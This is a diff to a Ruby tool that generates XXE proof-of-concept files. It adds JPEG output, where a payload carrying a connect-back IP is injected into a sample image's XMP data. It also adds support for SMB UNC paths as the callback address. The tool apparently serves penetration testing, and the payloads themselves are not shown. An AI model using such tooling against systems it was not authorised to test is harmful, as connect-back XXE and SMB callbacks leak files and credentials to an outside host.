@@ -26,7 +26,7 @@ OptionParser.new do |opts|
 	opts.on("-z", "--fuzz=FUZZ_FILE", "A file including XSS to fuzz for, one per line") do |v|
 		@options["fuzz"] = v
 	end
-	opts.on("-t", "--poc=POC", "Very simple XMP POC test; handles PDF, GIF right now") do |v|
+	opts.on("-t", "--poc=POC", "Very simple XMP POC test; handles PDF, GIF, JPEG right now") do |v|
 		@options["poc"] = v
 	end
 	opts.on("-i", "--ip=IP", "Set connect back IP") do |v|
@@ -50,7 +50,9 @@ end.parse!
 # set the protocol if the user hasn't
 def set_protocol(ip)
 	unless ip.include?("://")
-		ip = "http://"+ip
+		unless ip.include?("\\\\")
+			ip = "http://"+ip
+		end
 	end
 	return ip
 end
@@ -126,8 +128,11 @@ if @options["poc"]
 	if payload =~ /IP/ and @options["ip"].size == 0
 		@options["ip"] = ask("Payload Requires a connect back IP:")
 	end
-	@options["ip"] = set_protocol(@options["ip"])
+
+	# patch for smb, needs to be refactored throughout
+	@options["ip"] = set_protocol(@options["ip"]).gsub('\\') {'\\\\'}
 	payload = payload.gsub("IP",@options["ip"])
+
 
 	if @options["poc"] == "pdf"
 		# it's a hack, but gsubing into form pdf
@@ -149,6 +154,7 @@ if @options["poc"]
 		end
 		puts "|+| Wrote to #{nm}"
 		exit
+
 	elsif @options["poc"] == "gif"
 		file = "./samples/xmp.gif"
 
@@ -165,7 +171,25 @@ if @options["poc"]
 		end
 		puts "|+| Wrote to #{nm}"
 		exit
+
+	elsif @options["poc"] == "jpg"
+		file = "./samples/tunnel-depth.jpg"
+
+		puts "|+| Inserting into #{file}. Currently this only tests for PUBLIC DTD"
+
+		nm = "./output/o_#{Time.now.to_i}.jpg"
+
+		out = File.open(nm,"wb")
+		fil = File.open(file,"rb")
+
+		while(line = fil.gets)
+			line = line.gsub("-----",payload.gsub('\\') {'\\\\'})
+			out.puts(line)
+		end
+		puts "|+| Wrote to #{nm}"
+		exit
 	end
+
 end
 
 
